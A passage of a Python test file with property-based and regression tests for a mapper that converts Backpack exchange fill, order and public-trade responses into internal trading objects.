            assert isinstance(order_result.quantity_requested, Decimal)
            assert isinstance(order_result.price, Decimal)

    @given(
        symbol=trading_symbol_strategy(),
        timestamp=iso_timestamp_strategy(),
    )
    @settings(max_examples=100, deadline=None)
    def test_symbol_and_timestamp_consistency(self, symbol: str, timestamp: str) -> None:
        """Property: Symbol and timestamp handling should be consistent across types."""
        mapper = BackpackTransactionMapper()

        # Create fill and order with same symbol and timestamp
        raw_fill = BackpackRawFillResponse(
            fee="0.01",
            feeSymbol="USDC",
            isMaker=True,
            orderId="test_order",
            price="100.0",
            quantity="10.0",
            side="Bid",
            symbol=symbol,
            timestamp=timestamp,
            tradeId=123456,
            clientId=None,
            systemOrderType=None,
        )

        raw_order = BackpackRawOrderResponse(
            clientId=None,
            id="test_order",
            symbol=symbol,
            side="Bid",
            orderType="LIMIT",
            quantity="10.0",
            price="100.0",
            status="NEW",
            timeInForce="GTC",
            createdAt=timestamp,
            executedQuantity="0.0",
            executedQuoteQuantity="0.0",
            relatedOrderId=None,
            avgFillPrice=None,
            triggerPrice=None,
            triggerBy=None,
            reduceOnly=False,
            postOnly=False,
            selfTradePrevention="NONE",
            updatedAt=None,
            triggeredAt=None,
            expiryReason=None,
            origin="API",
        )

        try:
            fill_result = mapper.transform_raw_fill_to_internal(raw_fill)
            order_result = mapper.transform_raw_order_to_internal(raw_order)

            # Both results are guaranteed to be valid objects (not None) or exception is raised
            assert fill_result is not None
            assert order_result is not None

            # Property: Symbol transformation should be consistent
            assert fill_result.symbol == order_result.symbol

            # Property: Timestamp parsing should be consistent
            assert fill_result.executed_at == order_result.created_at

        except DataTransformationError:
            # Expected for some invalid symbol/timestamp combinations
            pass


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_fill_transformation_happy_path() -> None:
    """Test basic fill transformation for regression verification."""
    mapper = BackpackTransactionMapper()

    raw_fill = BackpackRawFillResponse(
        fee="0.05",
        feeSymbol="USDC",
        isMaker=True,
        orderId="order123",
        price="100.50",
        quantity="10.0",
        side="Bid",
        symbol="SOL-USDC",
        timestamp="2024-01-15T10:30:00Z",
        tradeId=123456,
        clientId=None,
        systemOrderType=None,
    )

    result = mapper.transform_raw_fill_to_internal(raw_fill)

    assert result is not None
    assert result.id == "123456"
    assert result.price == Decimal("100.50")
    assert result.quantity == Decimal("10.0")
    assert result.side == OrderSide.BUY


def test_order_transformation_happy_path() -> None:
    """Test basic order transformation for regression verification."""
    mapper = BackpackTransactionMapper()

    raw_order = BackpackRawOrderResponse(
        clientId=None,
        id="order123",
        symbol="SOL-USDC",
        side="Bid",
        orderType="LIMIT",
        quantity="10.0",
        price="100.50",
        status="NEW",
        timeInForce="GTC",
        createdAt="2024-01-15T10:30:00Z",
        executedQuantity="0.0",
        executedQuoteQuantity="0.0",
        relatedOrderId=None,
        avgFillPrice=None,
        triggerPrice=None,
        triggerBy=None,
        reduceOnly=False,
        postOnly=False,
        selfTradePrevention="NONE",
        updatedAt=None,
        triggeredAt=None,
        expiryReason=None,
        origin="API",
    )

    result = mapper.transform_raw_order_to_internal(raw_order)

    assert result.exchange_order_id == "order123"
    assert result.side == OrderSide.BUY
    assert result.order_type == OrderType.LIMIT
    assert result.status == OrderStatus.NEW


def test_zero_value_handling() -> None:
    """Test zero value handling for regression verification."""
    mapper = BackpackTransactionMapper()

    # Zero price
    raw_fill = BackpackRawFillResponse(
        fee="0.05",
        feeSymbol="USDC",
        isMaker=True,
        orderId="order123",
        price="0.0",
        quantity="10.0",
        side="Bid",
        symbol="SOL-USDC",
        timestamp="2024-01-15T10:30:00Z",
        tradeId=123456,
        clientId=None,
        systemOrderType=None,
    )

    result = mapper.transform_raw_fill_to_internal(raw_fill)
    assert result is None


def test_public_trade_limitation() -> None:
    """Test public trade transformation limitation for regression verification."""
    mapper = BackpackTransactionMapper()

    raw_trade = BackpackRawPublicTrade(
        id="trade123",
        symbol="SOL-USDC",
        price="100.50",
        qty="10.0",
        time="2024-01-15T10:30:00Z",
        orderId="order123",
    )

    result = mapper.transform_raw_fill_to_internal_public(raw_trade)
    assert result is None
